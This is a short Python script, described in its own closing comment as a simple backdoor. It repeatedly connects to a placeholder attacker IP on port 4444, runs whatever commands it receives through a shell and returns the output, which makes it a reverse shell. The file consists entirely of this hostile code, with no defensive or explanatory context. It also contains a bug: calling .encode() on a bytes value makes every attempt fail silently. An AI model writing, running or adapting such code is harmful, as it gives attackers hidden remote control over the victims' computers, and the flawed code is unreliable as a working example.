import socket
import subprocess
import time



def connect ():
    while True:
        try:
        
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("ip_atacante", 4444))  
            s.send(b"Connected to backdoor\n".encode())
            while True:
                
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    s.close()
                    break
            
                output = subprocess.check_output(command, shell = True)
                s.send(output)

        except :
            print(f"Connection failed")
            time.sleep(5) 
            continue

connect()
# This code is a simple backdoor that connects to a specified attacker's IP address and port